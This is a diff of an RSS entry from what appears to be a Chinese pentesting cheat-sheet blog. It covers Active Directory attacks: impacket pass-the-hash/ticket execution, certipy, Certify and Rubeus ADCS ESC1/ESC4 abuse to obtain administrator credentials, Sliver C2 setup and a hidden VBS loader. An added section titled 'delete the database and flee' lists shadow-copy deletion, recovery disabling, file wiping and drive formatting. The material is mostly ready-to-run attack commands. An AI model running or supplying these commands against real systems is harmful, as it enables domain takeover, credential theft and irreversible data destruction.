@@ -12,8 +12,8 @@
         <pubDate>Fri, 31 Oct 2025 19:40:56 +0800</pubDate>
         
         <guid>https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</guid>
-        <description>&lt;p&gt;ntp方式# 信息收集-枚举&lt;/p&gt;
-&lt;h2 id=&#34;前枚举&#34;&gt;前枚举
+        <description>&lt;h1 id=&#34;信息收集-枚举&#34;&gt;信息收集-枚举
+&lt;/h1&gt;&lt;h2 id=&#34;前枚举&#34;&gt;前枚举
 &lt;/h2&gt;&lt;h3 id=&#34;域名解析&#34;&gt;域名解析
 &lt;/h3&gt;&lt;p&gt;nxc&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nxc smb ip --generate-hosts-file hostname
@@ -589,7 +589,7 @@ nxc&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-psexec &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$domain&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;@&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -hashes $hashes -no-pass
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用票据&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-psexec &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$domain&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;@&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -k -no-pass
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;本地计算机用户&#34;&gt;本地计算机用户
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;域内本地计算机用户&#34;&gt;域内本地计算机用户
 &lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-psexec &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.\$user&amp;#39;&lt;/span&gt;:$pass@$ip
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用hash&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-psexec &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.\$user&amp;#39;&lt;/span&gt;@$ip -hashes $hashes -no-pass
@@ -602,7 +602,7 @@ nxc&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-smbexec &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$domain&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;@&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -hashes $hashes -no-pass
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用票据&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-smbexec &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$domain&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;@&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -k -no-pass
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;本地计算机用户-1&#34;&gt;本地计算机用户
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;域内本地计算机用户-1&#34;&gt;域内本地计算机用户
 &lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-smbexec &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.\$user&amp;#39;&lt;/span&gt;:$pass@$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用hash&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-smbexec &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.\$user&amp;#39;&lt;/span&gt;@$ip -hashes $hashes -no-pass
@@ -615,7 +615,7 @@ nxc&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-wmiexec &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$domain&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;@&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -hashes $hashes -no-pass
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;传递票据&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-wmiexec &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$domain&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;@&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -k -no-pass
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;本地计算机用户-2&#34;&gt;本地计算机用户
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;域内本地计算机用户-2&#34;&gt;域内本地计算机用户
 &lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-wmiexec &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.\$user&amp;#39;&lt;/span&gt;:$pass@$ip
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;传递hash&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-wmiexec &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.\$user&amp;#39;&lt;/span&gt;@$ip -hashes $hashes -no-pass
@@ -2286,7 +2286,8 @@ nxc&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;比如上面查到管理员sid为S-1-5-21-2983547755-698260136-4283918172-500，则可以将-upn &amp;lsquo;administrator@$domain&amp;rsquo; ，添加上-sid S-1-5-21-2983547755-698260136-4283918172-500，变成这样&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certipy req -u $user@$doamin -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$pass&amp;#39;&lt;/span&gt; -ca $ca -target $FQDN_ca -template &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CorpKerbAuth&amp;#39;&lt;/span&gt; -upn &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;administrator@$domain&amp;#39;&lt;/span&gt; -sid S-1-5-21-2983547755-698260136-4283918172-500 -out &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cert&amp;#39;&lt;/span&gt; -dc-ip $ip
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;esc4&#34;&gt;ESC4
-&lt;/h3&gt;&lt;p&gt;esc4的原理是某个证书被配置了某权限能全权更改或者编辑的设置，如果我们有这个更改权限就能打esc4&lt;/p&gt;
+&lt;/h3&gt;&lt;h4 id=&#34;远程&#34;&gt;远程
+&lt;/h4&gt;&lt;p&gt;esc4的原理是某个证书被配置了某权限能全权更改或者编辑的设置，如果我们有这个更改权限就能打esc4&lt;/p&gt;
 &lt;p&gt;最基础的打法就是将证书修改为esc1的类型，之后直接打esc1，certipy在4.8与5.02的命令不同，以下我记录的是5.02版本&lt;/p&gt;
 &lt;p&gt;首先更改目标模板为esc1类型&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certipy template -u $user@$domain -hashes $ntlm -template &amp;lt;模板名称&amp;gt; -write-default-configuration -no-save
@@ -2296,8 +2297,19 @@ nxc&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certipy req -u $user@$domain -hashes $ntlm -ca $ca -template &amp;lt;模板名称&amp;gt; -upn administrator@$domain 
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;或者
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certipy req -u $user@$domain -p $pass -ca $ca -template &amp;lt;模板名称&amp;gt; -upn administrator@$domain 
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;亲求管理员hash&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;请求管理员hash&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certipy auth -pfx administrator.pfx -dc-ip $ip
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;本地&#34;&gt;本地
+&lt;/h4&gt;&lt;p&gt;修改为esc1&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;tandIn_v13_Net35.exe --ADCS --filter Machine --ess --add
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;赋予域用户注册权&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;tandIn_v13_Net35.exe --ADCS --filter Machine --ntaccount &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;domain\domain users&amp;#34;&lt;/span&gt; --enroll --add
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;请求管理员证书&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certify.exe request /ca:dc01.mythical-us.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\m&lt;/span&gt;ythical-us-DC01-CA /template:Machine /altname:administrator@mythical-us.vl
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将输出保存为pem并转换&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl pkcs12 -in cert.pem -keyex -CSP &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Microsoft Enhanced Cryptographic Provider v1.0&amp;#34;&lt;/span&gt; -export -out cert.pfx
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用rubeus获取hash&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;\R&lt;/span&gt;ubeus.exe asktgt /user:Administrator /certificate:C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\M&lt;/span&gt;omo.Ayase&lt;span style=&#34;color:#ae81ff&#34;&gt;\c&lt;/span&gt;ert.pfx /ptt /nowrap /getcredentials
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;esc8&#34;&gt;ESC8
 &lt;/h3&gt;&lt;p&gt;参考文章&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://vuln.dev/vulnlab-cicada/#exploitation
@@ -2710,7 +2722,7 @@ targetedKerberoast.py&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set-DomainObject -identity $user -SET @&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;serviceprincipalname&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test/$host&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后直接打Invoke-Kerberost，或者利用如下面命令请求tgt之后搞到v2hash，只需要powerview&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-DomainUSer RSA_4810 | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;远程&#34;&gt;远程
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;远程-1&#34;&gt;远程
 &lt;/h5&gt;&lt;p&gt;targetedKerberoast.py&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;targetedKerberoast.py -v -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$DC_HOST&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$USER&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$PASSWORD&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; --dc-ip $ip
@@ -2853,7 +2865,9 @@ targetedKerberoast.py&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;run
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;msf不适合自己做持久化，因为其生成的exe都是报毒的&lt;/p&gt;
 &lt;h2 id=&#34;sliver使用相关&#34;&gt;sliver使用相关
-&lt;/h2&gt;&lt;p&gt;部署相关，一般直接开包即用，如果是vps环境建议部署如下两个辅助工具&lt;/p&gt;
+&lt;/h2&gt;&lt;h3 id=&#34;bof&#34;&gt;bof
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://github.com/sliverarmory
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;部署相关，一般直接开包即用，如果是vps环境建议部署如下两个辅助工具&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt install wireguard-tools
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt install git mingw-w64
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;也可以一键直接部署&lt;/p&gt;
@@ -2907,7 +2921,32 @@ targetedKerberoast.py&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;loader.vbs&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set ws&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;WScript.CreateObject&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;WScript.Shell&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;ws.Run &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;start.bat&amp;#34;&lt;/span&gt;,0
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;后渗透利用&#34;&gt;后渗透利用
-&lt;/h1&gt;&lt;h2 id=&#34;defender相关&#34;&gt;defender相关
+&lt;/h1&gt;&lt;h1 id=&#34;删库跑路&#34;&gt;删库跑路
+&lt;/h1&gt;&lt;p&gt;禁用所有恢复数据的策略&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cmd.exe /c vssadmin.exe Delete Shadows /All /Quiet &amp;amp; bcdedit /set &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;default&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; recoveryenabled No &amp;amp; bcdedit /set &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;default&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; bootstatuspolicy ignoreallfailures
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;删库&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Remove-Item -Path &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\Your\Path&amp;#34;&lt;/span&gt; -Recurse -Force
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;填充无意义字符&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cipher /w:C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\Y&lt;/span&gt;our&lt;span style=&#34;color:#ae81ff&#34;&gt;\P&lt;/span&gt;ath
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或者格式化盘符&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;format D: /fs:ntfs /p:1 /q
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;rodc相关&#34;&gt;rodc相关
+&lt;/h1&gt;&lt;p&gt;获取rodc管理员后，我们可以横向至主域，目前没有找到远程利用方式，主要使用powerview以及鲁博本地攻击&lt;/p&gt;
+&lt;p&gt;第一步，获取当前rodc的krbtgt用户hash，用户名称格式一般位krbtgt_$奇怪数字&lt;/p&gt;
